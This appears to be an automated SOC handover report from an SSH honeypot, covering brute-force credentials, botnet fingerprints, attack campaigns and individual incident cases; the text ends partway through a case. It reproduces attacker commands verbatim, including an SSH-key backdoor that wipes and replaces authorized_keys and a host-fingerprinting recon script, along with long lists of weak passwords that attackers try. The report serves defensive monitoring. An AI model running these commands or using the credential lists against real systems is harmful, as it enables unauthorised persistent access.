# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-06 |
| **Generated At** | 2026-07-06T16:55:02Z |
| **Shift Time** | 16:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **415** |
| Confirmed Threats | **415** |
| False Positives Filtered | **0** (0.0%) |
| Unique Attacker IPs | **43** |
| Countries of Origin | **13** |
| High Severity Cases | **181** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **234** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **218** |
| Unique Credential Pairs | **166** |
| Unique Usernames | **20** |
| Unique Passwords | **101** |
| Successful Auth Pairs | **189** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 37 |
| `oracle` | 31 |
| `postgres` | 27 |
| `admin` | 25 |
| `support` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 18 |
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 16 |
| `123qwe` | 6 |
| `123456` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 18 |
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `3245gs5662d34` | 10 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 3 |
| `*1` | `$4` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `1234` | `91.92.40.6` | 2026-07-06T12:55:20 |
| `git` | `git2026` | `10.0.0.73` | 2026-07-06T12:56:29 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-06T12:56:34 |
| `git` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T12:56:36 |
| `admin` | `12345` | `91.92.40.6` | 2026-07-06T12:56:46 |
| `postgres` | `test` | `91.92.40.176` | 2026-07-06T12:56:59 |
| `admin` | `rod` | `10.0.0.73` | 2026-07-06T12:57:14 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T12:57:20 |
| `administrator` | `Password@123` | `10.0.0.73` | 2026-07-06T12:57:59 |
| `administrator` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T12:58:01 |
| `root` | `qwertyui` | `45.198.224.120` | 2026-07-06T12:58:01 |
| `admin` | `123456` | `91.92.40.6` | 2026-07-06T12:58:10 |
| `support` | `support` | `176.53.159.196` | 2026-07-06T12:58:30 |
| `support` | `support` | `10.0.0.73` | 2026-07-06T12:58:46 |
| `postgres` | `test123` | `91.92.40.176` | 2026-07-06T12:59:16 |
| `admin` | `1234567` | `91.92.40.6` | 2026-07-06T12:59:33 |
| `root` | `rootroot` | `10.0.0.73` | 2026-07-06T13:00:38 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T13:00:40 |
| `admin` | `12345678` | `91.92.40.6` | 2026-07-06T13:00:55 |
| `postgres` | `test321` | `91.92.40.176` | 2026-07-06T13:01:34 |
| `admin` | `@dmin` | `10.0.0.73` | 2026-07-06T13:02:11 |
| `admin` | `123456789` | `91.92.40.6` | 2026-07-06T13:02:17 |
| `admin` | `1234567890` | `91.92.40.6` | 2026-07-06T13:03:41 |
| `postgres` | `password` | `91.92.40.176` | 2026-07-06T13:03:56 |
| `root` | `starwars` | `185.242.3.195` | 2026-07-06T13:04:17 |
| `admin` | `123qwe` | `91.92.40.6` | 2026-07-06T13:05:05 |
| `postgres` | `passwd` | `91.92.40.176` | 2026-07-06T13:06:16 |
| `admin` | `123qwerty` | `91.92.40.6` | 2026-07-06T13:06:28 |
| `admin` | `21` | `91.92.40.6` | 2026-07-06T13:07:51 |
| `root` | `starwars` | `10.0.0.73` | 2026-07-06T13:07:57 |
| `postgres` | `pass` | `91.92.40.176` | 2026-07-06T13:08:34 |
| `admin` | `321` | `91.92.40.6` | 2026-07-06T13:09:14 |
| `admin` | `654321` | `91.92.40.6` | 2026-07-06T13:10:39 |
| `postgres` | `P@ssw0rd` | `91.92.40.176` | 2026-07-06T13:10:54 |
| `root` | `myheritage` | `45.198.224.120` | 2026-07-06T13:11:07 |
| `admin` | `Password` | `91.92.40.6` | 2026-07-06T13:12:02 |
| `postgres` | `qwe123` | `91.92.40.176` | 2026-07-06T13:13:14 |
| `admin` | `admin` | `91.92.40.6` | 2026-07-06T13:13:26 |
| `admin` | `admin1` | `91.92.40.6` | 2026-07-06T13:14:48 |
| `postgres` | `qwer1234` | `91.92.40.176` | 2026-07-06T13:15:27 |
| `root` | `hhhhhhhh` | `203.116.129.55` | 2026-07-06T13:15:39 |
| `345gs5662d34` | `345gs5662d34` | `203.116.129.55` | 2026-07-06T13:15:43 |
| `root` | `3245gs5662d34` | `203.116.129.55` | 2026-07-06T13:15:45 |
| `admin` | `admin12` | `91.92.40.6` | 2026-07-06T13:16:10 |
| `admin` | `admin123` | `91.92.40.6` | 2026-07-06T13:17:33 |
| `postgres` | `password123` | `91.92.40.176` | 2026-07-06T13:17:42 |
| `admin` | `pa$w0rd` | `91.92.40.6` | 2026-07-06T13:18:56 |
| `postgres` | `qwerty123456` | `91.92.40.176` | 2026-07-06T13:20:03 |
| `admin` | `passw0rd` | `91.92.40.6` | 2026-07-06T13:20:19 |
| `root` | `root1root` | `121.200.49.221` | 2026-07-06T13:20:37 |
| `345gs5662d34` | `345gs5662d34` | `121.200.49.221` | 2026-07-06T13:20:41 |
| `root` | `3245gs5662d34` | `121.200.49.221` | 2026-07-06T13:20:42 |
| `admin` | `password` | `91.92.40.6` | 2026-07-06T13:21:40 |
| `root` | `pol123` | `129.121.47.136` | 2026-07-06T13:22:08 |
| `345gs5662d34` | `345gs5662d34` | `129.121.47.136` | 2026-07-06T13:22:10 |
| `root` | `3245gs5662d34` | `129.121.47.136` | 2026-07-06T13:22:11 |
| `postgres` | `1234qwer` | `91.92.40.176` | 2026-07-06T13:22:17 |
| `admin` | `qwerty` | `91.92.40.6` | 2026-07-06T13:23:01 |
| `root` | `Heslo1234` | `45.198.224.120` | 2026-07-06T13:23:36 |
| `backup` | `123qwe` | `91.92.40.6` | 2026-07-06T13:24:22 |
| `postgres` | `123qwe` | `91.92.40.176` | 2026-07-06T13:24:40 |
| `backup` | `54321` | `91.92.40.6` | 2026-07-06T13:25:45 |
| `postgres` | `passpass` | `91.92.40.176` | 2026-07-06T13:26:43 |
| `backup` | `backup` | `91.92.40.6` | 2026-07-06T13:27:09 |
| `backup` | `backup1` | `91.92.40.6` | 2026-07-06T13:28:33 |
| `postgres` | `pass123` | `91.92.40.176` | 2026-07-06T13:28:58 |
| `backup` | `backup12` | `91.92.40.6` | 2026-07-06T13:29:56 |
| `postgres` | `pass1234` | `91.92.40.176` | 2026-07-06T13:31:06 |
| `backup` | `backup123` | `91.92.40.6` | 2026-07-06T13:31:20 |
| `backup` | `wasd` | `91.92.40.6` | 2026-07-06T13:32:44 |
| `postgres` | `wasd` | `91.92.40.176` | 2026-07-06T13:33:14 |
| `debian` | `123qwe` | `91.92.40.6` | 2026-07-06T13:34:08 |
| `postgres` | `qwerty` | `91.92.40.176` | 2026-07-06T13:35:25 |
| `debian` | `54321` | `91.92.40.6` | 2026-07-06T13:35:32 |
| `ubuntu` | `admini` | `45.198.224.120` | 2026-07-06T13:36:01 |
| `debian` | `654321` | `91.92.40.6` | 2026-07-06T13:36:55 |
| `postgres` | `q1w2e3` | `91.92.40.176` | 2026-07-06T13:37:28 |
| `debian` | `debian` | `91.92.40.6` | 2026-07-06T13:38:17 |
| `postgres` | `q1w2e3r4` | `91.92.40.176` | 2026-07-06T13:39:28 |
| `debian` | `debian12` | `91.92.40.6` | 2026-07-06T13:39:39 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-06T13:40:34 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-06T13:40:35 |
| `debian` | `debian123` | `91.92.40.6` | 2026-07-06T13:41:01 |
| `postgres` | `1q2w3e` | `91.92.40.176` | 2026-07-06T13:41:36 |
| `root` | `minhtuan` | `103.13.206.100` | 2026-07-06T13:41:46 |
| `root` | `ad1234` | `122.168.123.73` | 2026-07-06T13:41:50 |
| `345gs5662d34` | `345gs5662d34` | `103.13.206.100` | 2026-07-06T13:41:50 |
| `root` | `3245gs5662d34` | `103.13.206.100` | 2026-07-06T13:41:52 |
| `345gs5662d34` | `345gs5662d34` | `122.168.123.73` | 2026-07-06T13:41:55 |
| `root` | `3245gs5662d34` | `122.168.123.73` | 2026-07-06T13:41:57 |
| `debian` | `pa55word` | `91.92.40.6` | 2026-07-06T13:42:21 |
| `root` | `Ab123!@#` | `31.76.78.140` | 2026-07-06T13:43:15 |
| `345gs5662d34` | `345gs5662d34` | `31.76.78.140` | 2026-07-06T13:43:17 |
| `root` | `3245gs5662d34` | `31.76.78.140` | 2026-07-06T13:43:18 |
| `debian` | `qwerty` | `91.92.40.6` | 2026-07-06T13:43:42 |
| `postgres` | `1q2w3e4r` | `91.92.40.176` | 2026-07-06T13:43:53 |
| `deploy` | `1` | `91.92.40.6` | 2026-07-06T13:45:03 |
| `postgres` | `111111` | `91.92.40.176` | 2026-07-06T13:46:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.219.107` | 2026-07-06T13:46:18 |
| `deploy` | `12` | `91.92.40.6` | 2026-07-06T13:46:25 |
| `*1` | `$4` | `34.76.219.107` | 2026-07-06T13:46:27 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2914` | `34.76.219.107` | 2026-07-06T13:46:29 |
| `deploy` | `123` | `91.92.40.6` | 2026-07-06T13:47:47 |
| `root` | `666666` | `45.198.224.120` | 2026-07-06T13:48:08 |
| `postgres` | `qwerty123` | `91.92.40.176` | 2026-07-06T13:48:12 |
| `root` | `siesa1` | `111.47.243.219` | 2026-07-06T13:48:59 |
| `345gs5662d34` | `345gs5662d34` | `111.47.243.219` | 2026-07-06T13:49:04 |
| `root` | `3245gs5662d34` | `111.47.243.219` | 2026-07-06T13:49:06 |
| `deploy` | `1234` | `91.92.40.6` | 2026-07-06T13:49:07 |
| `postgres` | `123321` | `91.92.40.176` | 2026-07-06T13:50:11 |
| `deploy` | `12345` | `91.92.40.6` | 2026-07-06T13:50:28 |
| `root` | `123654a` | `193.164.155.115` | 2026-07-06T13:51:17 |
| `345gs5662d34` | `345gs5662d34` | `193.164.155.115` | 2026-07-06T13:51:20 |
| `root` | `3245gs5662d34` | `193.164.155.115` | 2026-07-06T13:51:21 |
| `deploy` | `123456` | `91.92.40.6` | 2026-07-06T13:51:49 |
| `postgres` | `321123` | `91.92.40.176` | 2026-07-06T13:52:15 |
| `deploy` | `1234567` | `91.92.40.6` | 2026-07-06T13:53:11 |
| `postgres` | `p@ssw0rd` | `91.92.40.176` | 2026-07-06T13:54:22 |
| `deploy` | `12345678` | `91.92.40.6` | 2026-07-06T13:54:32 |
| `deploy` | `123456789` | `91.92.40.6` | 2026-07-06T13:55:53 |
| `oracle` | `123456` | `91.92.40.176` | 2026-07-06T13:56:07 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `130.211.64.11` | 2026-07-06T13:57:02 |
| `deploy` | `1234567890` | `91.92.40.6` | 2026-07-06T13:57:14 |
| `*1` | `$4` | `130.211.64.11` | 2026-07-06T13:57:16 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4463` | `130.211.64.11` | 2026-07-06T13:57:18 |
| `oracle` | `654321` | `91.92.40.176` | 2026-07-06T13:57:59 |
| `deploy` | `deploy` | `91.92.40.6` | 2026-07-06T13:58:34 |
| `oracle` | `123` | `91.92.40.176` | 2026-07-06T13:59:56 |
| `deploy` | `passw0rd` | `91.92.40.6` | 2026-07-06T13:59:56 |
| `xieminwen` | `xieminwen` | `45.198.224.120` | 2026-07-06T14:00:06 |
| `root` | `P@55w0rd!` | `185.242.3.195` | 2026-07-06T14:00:10 |
| `deploy` | `password` | `91.92.40.6` | 2026-07-06T14:01:16 |
| `oracle` | `321` | `91.92.40.176` | 2026-07-06T14:01:51 |
| `dev` | `123` | `91.92.40.6` | 2026-07-06T14:02:37 |
| `oracle` | `test` | `91.92.40.176` | 2026-07-06T14:03:56 |
| `dev` | `123qwe` | `91.92.40.6` | 2026-07-06T14:03:57 |
| `dev` | `123qwerty` | `91.92.40.6` | 2026-07-06T14:05:17 |
| `oracle` | `test123` | `91.92.40.176` | 2026-07-06T14:05:56 |
| `dev` | `54321` | `91.92.40.6` | 2026-07-06T14:06:36 |
| `root` | `1201` | `10.0.0.73` | 2026-07-06T14:06:49 |
| `root` | `1qasde32w` | `10.0.0.73` | 2026-07-06T14:07:23 |
| `oracle` | `test321` | `91.92.40.176` | 2026-07-06T14:07:53 |
| `dev` | `dev` | `91.92.40.6` | 2026-07-06T14:07:57 |
| `dev` | `dev1` | `91.92.40.6` | 2026-07-06T14:09:18 |
| `oracle` | `password` | `91.92.40.176` | 2026-07-06T14:09:54 |
| `dev` | `dev123` | `91.92.40.6` | 2026-07-06T14:10:40 |
| `oracle` | `passwd` | `91.92.40.176` | 2026-07-06T14:11:50 |
| `dev` | `password` | `91.92.40.6` | 2026-07-06T14:12:01 |
| `root` | `pass123456` | `45.198.224.120` | 2026-07-06T14:12:29 |
| `dev` | `qwerty` | `91.92.40.6` | 2026-07-06T14:13:24 |
| `oracle` | `pass` | `91.92.40.176` | 2026-07-06T14:13:48 |
| `developer` | `1` | `91.92.40.6` | 2026-07-06T14:14:45 |
| `oracle` | `P@ssw0rd` | `91.92.40.176` | 2026-07-06T14:15:40 |
| `developer` | `123` | `91.92.40.6` | 2026-07-06T14:16:06 |
| `developer` | `1234` | `91.92.40.6` | 2026-07-06T14:17:26 |
| `oracle` | `qwe123` | `91.92.40.176` | 2026-07-06T14:17:37 |
| `developer` | `12345` | `91.92.40.6` | 2026-07-06T14:18:45 |
| `root` | `12345678*` | `10.0.0.73` | 2026-07-06T14:19:20 |
| `oracle` | `qwer1234` | `91.92.40.176` | 2026-07-06T14:19:32 |
| `developer` | `123456` | `91.92.40.6` | 2026-07-06T14:20:05 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-06T14:21:04 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-06T14:21:05 |
| `oracle` | `password123` | `91.92.40.176` | 2026-07-06T14:21:09 |
| `reza2` | `reza2` | `10.0.0.73` | 2026-07-06T14:21:26 |
| `reza2` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T14:21:28 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5208` | `130.211.64.11` | 2026-07-06T14:22:00 |
| `oracle` | `qwerty123456` | `91.92.40.176` | 2026-07-06T14:22:38 |
| `oracle` | `1234qwer` | `91.92.40.176` | 2026-07-06T14:24:15 |
| `ubuntu` | `abcd123456789` | `45.198.224.120` | 2026-07-06T14:24:48 |
| `oracle` | `123qwe` | `91.92.40.176` | 2026-07-06T14:26:07 |
| `oracle` | `passpass` | `91.92.40.176` | 2026-07-06T14:28:16 |
| `git` | `0000` | `10.0.0.73` | 2026-07-06T14:28:37 |
| `oracle` | `pass123` | `91.92.40.176` | 2026-07-06T14:30:07 |
| `oracle` | `pass1234` | `91.92.40.176` | 2026-07-06T14:32:30 |
| `oracle` | `wasd` | `91.92.40.176` | 2026-07-06T14:34:28 |
| `oracle` | `qwerty` | `91.92.40.176` | 2026-07-06T14:36:10 |
| `ubuntu` | `hduser123` | `45.198.224.120` | 2026-07-06T14:37:06 |
| `oracle` | `q1w2e3` | `91.92.40.176` | 2026-07-06T14:37:50 |
| `oracle` | `q1w2e3r4` | `91.92.40.176` | 2026-07-06T14:39:34 |
| `oracle` | `1q2w3e` | `91.92.40.176` | 2026-07-06T14:41:13 |
| `root` | `P@55w0rd!` | `10.0.0.73` | 2026-07-06T14:41:23 |
| `oracle` | `1q2w3e4r` | `91.92.40.176` | 2026-07-06T14:42:59 |
| `oracle` | `111111` | `91.92.40.176` | 2026-07-06T14:44:41 |
| `oracle` | `qwerty123` | `91.92.40.176` | 2026-07-06T14:46:14 |
| `oracle` | `123321` | `91.92.40.176` | 2026-07-06T14:47:59 |
| `root` | `PASSW0RD` | `45.198.224.120` | 2026-07-06T14:49:15 |
| `oracle` | `321123` | `91.92.40.176` | 2026-07-06T14:49:35 |
| `oracle` | `p@ssw0rd` | `91.92.40.176` | 2026-07-06T14:51:20 |
| `user` | `123456` | `91.92.40.176` | 2026-07-06T14:53:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **415** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 149 |
| libssh | 35 |
| OpenSSH | 5 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 122 | 2 |
| `f555226df196...` | Mirai/variant | 26 | 10 |
| `16443846184e...` | Generic scanner | 13 | 2 |
| `eff4c24daffc...` | Modern SSH client | 9 | 1 |
| `a984ff804585...` | libssh-based | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 122 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 26 | 10 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 13 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 9 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 3 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 122 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.176`, `91.92.40.6`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `129.121.47.136`, `31.76.78.140`, `103.13.206.100`, `111.47.243.219`, `193.164.155.115`, `121.200.49.221`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **43** |
| Unique ASNs | **30** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS197170` | TechTies Inc. | 2 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (181)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-243a327e7c02

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:55 |
| **Last Seen** | 2026-07-06 12:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:55:18` | `cowrie.session.connect` |
| `2026-07-06 12:55:18` | `cowrie.client.version` |
| `2026-07-06 12:55:18` | `cowrie.client.kex` |
| `2026-07-06 12:55:20` | `cowrie.login.success` |
| `2026-07-06 12:55:21` | `cowrie.session.params` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.command.success` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.command.input` |
| `2026-07-06 12:55:21` | `cowrie.log.closed` |
| `2026-07-06 12:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2436cef2e4a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:56 |
| **Last Seen** | 2026-07-06 12:57 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:56:38` | `cowrie.session.connect` |
| `2026-07-06 12:56:43` | `cowrie.client.version` |
| `2026-07-06 12:56:43` | `cowrie.client.kex` |
| `2026-07-06 12:56:59` | `cowrie.login.success` |
| `2026-07-06 12:57:07` | `cowrie.session.params` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:07` | `cowrie.command.success` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:07` | `cowrie.command.input` |
| `2026-07-06 12:57:11` | `cowrie.log.closed` |
| `2026-07-06 12:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91f9c842ac77

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:56 |
| **Last Seen** | 2026-07-06 12:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:56:44` | `cowrie.session.connect` |
| `2026-07-06 12:56:44` | `cowrie.client.version` |
| `2026-07-06 12:56:44` | `cowrie.client.kex` |
| `2026-07-06 12:56:46` | `cowrie.login.success` |
| `2026-07-06 12:56:47` | `cowrie.session.params` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:47` | `cowrie.command.success` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:47` | `cowrie.command.input` |
| `2026-07-06 12:56:48` | `cowrie.log.closed` |
| `2026-07-06 12:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a0109ebf26

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 12:57 |
| **Last Seen** | 2026-07-06 12:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:57:53` | `cowrie.session.connect` |
| `2026-07-06 12:57:55` | `cowrie.client.version` |
| `2026-07-06 12:57:55` | `cowrie.client.kex` |
| `2026-07-06 12:58:01` | `cowrie.login.success` |
